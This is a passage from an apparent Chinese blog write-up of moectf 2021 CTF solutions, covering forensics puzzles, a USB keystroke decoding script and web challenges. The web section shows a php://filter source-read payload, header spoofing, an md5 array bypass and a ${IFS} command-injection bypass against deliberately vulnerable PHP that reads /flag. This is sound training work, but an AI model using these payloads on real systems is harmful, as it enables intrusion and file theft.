src="https://i.loli.net/2021/09/24/8nzZTmi7hAcKkvM.png"></p><p>然后偶然发现一个网站，就起飞，嘿嘿嘿(<em>咱没有手撕能力</em>)</p><blockquote><p><a href="http://dialabc.com/sound/detect/index.html">http://dialabc.com/sound/detect/index.html</a></p></blockquote><p>再根据<code>audacity</code>给的间隔设置间隔符号就sucess了</p><p><img src="https://i.loli.net/2021/09/24/cSpaHYQn8R2DEgZ.png"></p><p><code>moectf&#123;114514-1919810-7738-9634&#125;</code></p><h2 id="社工题"><a href="#社工题" class="headerlink" title="社工题"></a><strong>社工题</strong></h2><p>Bing或者Google搜索<code>Noah的博客</code></p><p>先找到这个：<a href="https://noahtie.github.io/about/">About NoahBox | NoahBox (noahtie.github.io)</a>，点击签订契约转到第二个</p><p>第二个：<a href="https://masternoah.lofter.com/">诺亚城主 (lofter.com)</a>，点击上面的i，到第三个</p><p>第三个：<a href="https://noahbox.github.io/guestbook/">留言版 | Noah’s TRPG Box (noahbox.github.io)</a> 留言簿中发现这个<img src="https://i.loli.net/2021/09/24/Ckd7RgP9852LpbQ.png" alt="" style="zoom:50%;" /></p><p>在侧边栏找到github地址，进入发现被hacked的仓库有摩斯密码，解密即可</p><p><code>moectf&#123;HAHAHAHAH_NOAH_IS_A_VEGETABLE_CHICKEN&#125;</code></p><h2 id="好-康-的"><a href="#好-康-的" class="headerlink" title="好 康 的"></a><strong>好 康 的</strong></h2><blockquote><p>参考博客<a href="https://blog.csdn.net/weixin_50656679/article/details/108936650?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163249925516780262529870%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163249925516780262529870&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-24-108936650.pc_v2_rank_blog_default&utm_term=mkv&spm=1018.2226.3001.4450">https://blog.csdn.net/weixin_50656679/article/details/108936650?ops_request_misc=%7B%22request%5Fid%22%3A%22163249925516780262529870%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&amp;request_id=163249925516780262529870&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2<del>blog</del>first_rank_v2~rank_v29-24-108936650.pc_v2_rank_blog_default&amp;utm_term=mkv&amp;spm=1018.2226.300</a></p></blockquote><ol><li>播放发现在3分钟左右之后就不能播放，感觉有问题，用 <code>mkvtoolnix</code> 分离出来字幕和视频，拖进<code>010 Editor</code> 直接搜索 <code>moectf</code> ，找到flag</li><li>用potplayer打开视频，然后将字幕另存为1.ass，打开后发现最后一行为flag</li></ol><p><img src="https://i.loli.net/2021/09/25/gB9Y4Z8IwPEqed7.png"></p><p><code>moectf&#123;N3v3r_90tt@_L3t-y0U_dOwN~&#125;</code></p><h2 id="easyForensics"><a href="#easyForensics" class="headerlink" title="easyForensics"></a><strong>easyForensics</strong></h2><p>用 <code>AccessData FTK Imager</code> 打开，游览找到 <code>flag.mp4</code> ，非常惊喜，用各种办法尝试分析没得出任何信息(虽然发现有一些很奇怪的文件)</p><p>等到比赛结束的时候才知道不是这个文件(<del>Noah设陷阱哈</del>，比赛结束后在 <code>FTK</code> 里发现一些被删除的文件夹(Base64命名)还有一个python文件，全部导出来，然后用bat导出文件名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DIR *. * /B&gt; LIST.TXT</span><br></pre></td></tr></table></figure><p>看到python文件中有 <code>data = data.replace(&quot;/&quot;, &quot;_&quot;)</code> 我们再将<code>_</code>全部换成<code>/</code></p><p>再用base64解码(我用<code>CyberChef</code>)查看16进制结果，发现是个word,网上找脚本输出word得出flag</p><p><code>moectf&#123;Th@1s_N0t_U53FULL@_4LL&#125;</code></p><h2 id="R-P-G"><a href="#R-P-G" class="headerlink" title="R P G"></a><strong>R P G</strong></h2><p><del>这个我以为要修改数据通关数据，确实也是如此因为实在过不了关</del></p><p>Noah师傅传授的一种就是交换<code>Data</code>  里的<code>Map001.json</code> <code>和Map002.json</code> 的文件名称，便可通过第一关拿到第一个字母，*<del>往复循环</del>*你就可以得到base64编码的一串字符串（<del>秃了也变强了</del>）</p><p>其实打开map002.json，仔细查看便可以看到一列有规律的base64字符串，提取出来，反复解码，便得到</p><p><code>moectf&#123;Th3_w0rld_0f_G4m3&#125;</code></p><h2 id="诺亚的日记"><a href="#诺亚的日记" class="headerlink" title="诺亚的日记"></a><strong>诺亚的日记</strong></h2><blockquote><p>参考博客<a href="https://blog.csdn.net/qq_43625917/article/details/107723635?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163250153316780269830444%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163250153316780269830444&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-107723635.pc_search_result_hbase_insert&utm_term=tshark+usb&spm=1018.2226.3001.4187">https://blog.csdn.net/qq_43625917/article/details/107723635?ops_request_misc=%7B%22request%5Fid%22%3A%22163250153316780269830444%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=163250153316780269830444&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2<del>all</del>first_rank_ecpm_v1~rank_v31_ecpm-2-107723635.pc_search_result_hbase_insert&amp;utm_term=tshark+usb&amp;spm=1018.2226.3001.4187</a></p></blockquote><p>用<code>101editor</code>打开，发现了<code>wireshark</code>字样，正好之前用过，结果数据里面没有<code>Leftover Capture Data</code> ，就百度到上面的博客，在kali中执行以下命令，结果空白格，放到ubuntu里面分析，可以了(实际<em>kali的tshark的版本问题</em>)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br><span class="line">tshark -r usb.pcap -T fields -e usb.capdata | sed <span class="string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt <span class="comment">#提取并去除空行</span></span><br></pre></td></tr></table></figure><p>便提取到了usb的流量数据，然后用映射关系，将所做操作提取出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">normalKeys = &#123;</span><br><span class="line">    <span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>,</span><br><span class="line">    <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>,</span><br><span class="line">     <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>,</span><br><span class="line">      <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>,</span><br><span class="line">       <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>,</span><br><span class="line">        <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>,</span><br><span class="line">         <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,</span><br><span class="line">         <span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,</span><br><span class="line">         <span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,</span><br><span class="line">         <span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,</span><br><span class="line">         <span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,</span><br><span class="line">         <span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,</span><br><span class="line">         <span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;</span><br><span class="line">    <span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>,</span><br><span class="line">     <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>,</span><br><span class="line">      <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>,</span><br><span class="line">       <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>,</span><br><span class="line">        <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>,</span><br><span class="line">         <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>,</span><br><span class="line">          <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,</span><br><span class="line">          <span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = open(<span class="string">&#x27;usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    try:</span><br><span class="line">        <span class="keyword">if</span> line[0]!=<span class="string">&#x27;0&#x27;</span> or (line[1]!=<span class="string">&#x27;0&#x27;</span> and line[1]!=<span class="string">&#x27;2&#x27;</span>) or line[3]!=<span class="string">&#x27;0&#x27;</span> or line[4]!=<span class="string">&#x27;0&#x27;</span> or line[9]!=<span class="string">&#x27;0&#x27;</span> or line[10]!=<span class="string">&#x27;0&#x27;</span> or line[12]!=<span class="string">&#x27;0&#x27;</span> or line[13]!=<span class="string">&#x27;0&#x27;</span> or line[15]!=<span class="string">&#x27;0&#x27;</span> or line[16]!=<span class="string">&#x27;0&#x27;</span> or line[18]!=<span class="string">&#x27;0&#x27;</span> or line[19]!=<span class="string">&#x27;0&#x27;</span> or line[21]!=<span class="string">&#x27;0&#x27;</span> or line[22]!=<span class="string">&#x27;0&#x27;</span> or line[6:8]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">             <span class="built_in">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[6:8] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    try:</span><br><span class="line">        a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        del output[a]</span><br><span class="line">        del output[a-1]</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    try:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">            flag+=1</span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==2:</span><br><span class="line">                flag=0</span><br><span class="line">        <span class="keyword">if</span> flag!=0:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="comment">##结果2021nian&lt;SPACE&gt;8yue&lt;SPACE&gt;5ri&lt;SPACE&gt;,qing22&lt;DEL&gt;&lt;RET&gt;zuotian&lt;SPACE&gt;gei&lt;SPACE&gt;hanshu&lt;SPACE&gt;fale&lt;SPACE&gt;caotu&lt;SPACE&gt;,cadai&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;odaooo&lt;DEL&gt;&lt;DEL&gt;41tale&lt;SPACE&gt;,kaixin&lt;SPACE&gt;&lt;RET&gt;yizhou&lt;SPACE&gt;meiyoukan&lt;SPACE&gt;jiaran=61de&lt;SPACE&gt;shipinle&lt;SPACE&gt;,nanshou&lt;SPACE&gt;nie1&lt;RET&gt;dongfangyaohe&lt;SPACE&gt;musedash&lt;RET&gt;liandongle&lt;SPACE&gt;,shuangchukuangxi&lt;SPACE&gt;[unknown][unknown]&lt;DEL&gt;chu=2[unknown][unknown]&lt;RET&gt;moectf&lt;RET&gt;de&lt;SPACE&gt;misc&lt;RET&gt;ti&lt;SPACE&gt;caichule&lt;SPACE&gt;4dao2,male&lt;SPACE&gt;&lt;RET&gt;woxiang&lt;SPACE&gt;moyu2moyu&lt;SPACE&gt;mou&lt;DEL&gt;yu&lt;SPACE&gt;&lt;RET&gt;d&lt;DEL&gt;&lt;GA&gt;damedane&lt;RET&gt;\&lt;DEL&gt;,&lt;RET&gt;dameyo&lt;SPACE&gt;&lt;RET&gt;,&lt;RET&gt;damenanoyo&lt;SPACE&gt;&lt;RET&gt;&lt;RET&gt;xin2misc&lt;RET&gt;ti&lt;SPACE&gt;de&lt;SPACE&gt;flag&lt;RET&gt;xiangge3shengcao21yidiande&lt;SPACE&gt;&lt;RET&gt;jiujiao&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;yo&lt;DEL&gt;ng&lt;SPACE&gt;&lt;SPACE&gt;*moectf&lt;RET&gt;&#123;&#125;[unknown]D@m3daNe_D4me_yoooooo*[unknown][unknown][unknown]haole&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;SPACE&gt;haole&lt;SPACE&gt;riji&lt;SPACE&gt;.&lt;DEL&gt;.txt&lt;RET&gt;</span></span><br></pre></td></tr></table></figure><p><code>moectf&#123;D@m3daNe_D4me_yoooooo&#125;</code></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a><strong>GET</strong></h2><p>用GET获取<br><code>http://47.93.215.154:10000/?moe=flag</code></p><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a><strong>POST</strong></h2><p><code>Hackerbar</code> 发个POST</p><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a><strong>Cookie</strong></h2><p>页面显示flag只给cookie，于是查看cookie，发现其值为0.说明我不是VIP！<br>于是修改其值为1 于是flag就交给我了。<br><code>moectf&#123;C00kie_1s_sw33t!&#125;</code></p><h2 id="2048"><a href="#2048" class="headerlink" title="2048"></a><strong>2048</strong></h2><p>web题下js类的题目，在游戏开始和结束时都会发送请求。开bp！ </p><p><img src="https://i.loli.net/2021/09/21/gbu8cPvH3lyhSRZ.png"> </p><p>传参指定参数即可</p><p><img src="https://i.loli.net/2021/09/21/1sKfCVTO9hNyS67.png"></p><p>开游戏，抓包，乱玩，死了，找到包发到repeater，分数一改，发过去，flag就有啦。  </p><p><code>moectf&#123;2048_1s_intere5t1ng!&#125;</code></p><h2 id="Web-Inc"><a href="#Web-Inc" class="headerlink" title="Web_Inc"></a><strong>Web_Inc</strong></h2><p>百度搜索:md5绕过  </p><p><img src="https://i.loli.net/2021/09/21/DCytjM7OwfbKoAq.png"></p><p>题目要求是a,b不相等，但它们的md5值严格相等，<font color='red'>注意是===而不是==</font></p><p>可以构造数组绕过，<code>a[]=1 b[]=2</code>,传参得到flag</p><p><img src="https://i.loli.net/2021/09/21/blLWIVTosDG2YmF.png"></p><p>已知数组是不可哈希类型，而md5是基于哈希算法。所以ab赋为不同值数组，md5之后都是NULL但值不同所以就过了。flag get！<br><code>moectf&#123;xdsec3gf9dfg62fh342&#125;</code></p><h2 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a><strong>ez_include</strong></h2><p>此题用php://input传参发现没有反应，估计是input被屏蔽了，尝试使用<font color='red'>filter</font>协议读取flag.php的源码，并用base64解密</p><p><img src="https://i.loli.net/2021/09/21/HF2gSVjakIBxo73.png"></p><p><code>php://filter/read=convert.base64-encode/resource=flag.php``moectf&#123;xdsec6asdgas7ahfsfaxczc&#125;</code></p><p>解密得到：<?$flag="moectf{xdsec6asdgas7ahfsfaxczc}";?></p><h2 id="Do-your-know-http"><a href="#Do-your-know-http" class="headerlink" title="Do your know http?"></a><strong>Do your know http?</strong></h2><p>这题考察的应该是对HTTP头的理解，采用Burpsuite抓包修改进行解题</p><p>共有四关，1.用’HS’来请求试试？改成<code>HS</code></p><img src="https://i.loli.net/2021/09/21/lf4NeDthuJAEbpx.png" alt=""  /><p>2.用本地ip访问<br><code>X-forwarded-for:127.0.0.1</code></p><p><img src="https://i.loli.net/2021/09/21/bVkfSq4zwtA27XE.png"></p><p>3.网页来源</p><p><code>referer:www.ltyyds.com</code></p><p><img src="https://i.loli.net/2021/09/21/HduOYyIQwqanFzU.png"></p><p>4.伪造浏览器</p><p><code>User-Agent: LT</code></p><p><img src="https://i.loli.net/2021/09/21/Fr5QYVbjnRwShzq.png"></p><p><code>moectf&#123;HTTPHeaders_1s_s0_ea5y!&#125;</code></p><h2 id="babeRCE"><a href="#babeRCE" class="headerlink" title="babeRCE"></a><strong>babeRCE</strong></h2><blockquote><p>参考博客<a href="https://www.cnblogs.com/0yst3r-2046/p/12600073.html">https://www.cnblogs.com/0yst3r-2046/p/12600073.html</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$rce</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">system(<span class="variable">$rce</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hhhhhhacker!!!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">highlight_file(**FILE**);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审查代码看到<em>cat more less nl tac等</em> 都被过滤了，ls没被过滤，用<code>burpsuite</code> 进行监控，重发</p><p><code>?rce=ls</code></p><p><code>find$&#123;IFS&#125;/$&#123;IFS&#125;-name$&#123;IFS&#125;fla\g</code>  </p><p>发现了/flag以及index.php，<del>绝笔藏在flag，但不能直接看，那就绕过</del></p><p><code>?rce=ca\t$&#123;IFS&#125;/fla\g</code> ,得到flag</p><p><code>moectf&#123;Do_y0u_l1k3_Rcccccccccccccce?&#125;</code></p><h2 id="ezunserialize"><a href="#ezunserialize" class="headerlink" 